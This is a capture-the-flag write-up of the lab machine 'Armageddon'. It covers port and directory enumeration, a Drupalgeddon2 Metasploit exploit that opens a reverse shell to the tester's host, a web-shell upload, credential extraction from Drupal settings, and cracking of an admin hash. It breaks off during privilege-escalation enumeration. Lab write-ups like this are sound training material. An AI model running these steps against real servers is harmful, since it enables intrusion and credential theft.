# Armageddon

## Enumeration

### Nmap

```
╭─zoey@parrot-virtual ~/sec ‹master*› 
╰─$ nmap -A -p- 10.10.10.233 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 23:29 BST
Nmap scan report for 10.10.10.233
Host is up (0.074s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```



### Gobuster

```
/cgi-bin/ (Status: 403)
/cron.php (Status: 403)
/includes (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/install.php (Status: 200)
/LICENSE.txt (Status: 200)
/misc (Status: 301)
/modules (Status: 301)
/profiles (Status: 301)
/README.txt (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/scripts (Status: 301)
/sites (Status: 301)
/themes (Status: 301)
/update.php (Status: 403)
/web.config (Status: 200)
/xmlrpc.php (Status: 200)
/xmlrpc.php (Status: 200)
```

### Drupalgeddon

https://www.exploit-db.com/exploits/44542

## Reverse Shell - apache user

```
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Sending stage (39282 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.233:41464) at 2021-04-01 00:26:23 +0100

meterpreter > ls
Listing: /var/www/html
```

Also upload bash.php to web root

## Database User

in `/var/www/html/sites/default`
```
$databases = array (
'default' =>
array (
'default' =>
array (
'database' => 'drupal',
'username' => 'drupaluser',
'password' => 'CQHEy@9M*m23gBVj',
'host' => 'localhost',
'port' => '',
'driver' => 'mysql',
'prefix' => '',
),
),
);
[...]
$drupal_hash_salt = '4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns';
```

## Users in Database

Using the `bash.php` web shell:

```
apache@armageddon.htb:/var/www/html# mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
uid name pass mail theme signature signature_format created access login status timezone language picture init data
0 NULL 0 0 0 0 NULL 0 NULL
1 brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu filtered_html 1606998756 1607077194 1607076276 1 Europe/London 0 admin@armageddon.eu a:1:{s:7:"overlay";i:1;}
```

Also in `/etc/passwd` is `brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash`

## Cracking the Hash

```
PS C:\Program Files\hashcat>  .\hashcat64.exe -m 7900 -a 0 E:\temp\bruce.hash E:\wordlists\rockyou.txt
hashcat (v5.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 980 Ti, 1536/6144 MB allocatable, 22MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: E:\wordlists\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Drupal7
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Time.Started.....: Wed Mar 31 17:33:25 2021 (10 secs)
Time.Estimated...: Wed Mar 31 17:33:35 2021 (0 secs)
Guess.Base.......: File (E:\wordlists\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    19176 H/s (8.68ms) @ Accel:128 Loops:32 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 180224/14344385 (1.26%)
Rejected.........: 0/180224 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:32736-32768
Candidates.#1....: 123456 -> sandy09
Hardware.Mon.#1..: Temp: 73c Fan: 67% Util: 99% Core:1404MHz Mem:3610MHz Bus:16
```

# Root

## Enumeration

```
sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

```
[+] Looking for unexpected auth lines in /etc/pam.d/sshd
auth       required     pam_sepermit.so
auth       substack     password-auth
auth       include      postlogin
-auth      optional     pam_reauthorize.so prepare
account    include      password-auth
password   include      password-auth
session    include      password-auth
-session   optional     pam_reauthorize.so prepare
```

## Nmap on SMTP

```
╭─zoey@parrot-virtual ~/sec/htb/armageddon ‹master*› 
╰─$ ssh -f -N -D 9050 brucetherealadmin@armageddon.htb
brucetherealadmin@armageddon.htb's password: 
╭─zoey@parrot-virtual ~/sec/htb/armageddon ‹master*› 
╰─$ proxychains nmap -A -p 25 127.0.0.1                                                                                                                                                    134 ↵
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-01 02:28 BST
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:80-<><>-OK
Nmap scan report for localhost (127.0.0.1)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: armageddon.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
Service Info: Host:  armageddon.htb
```
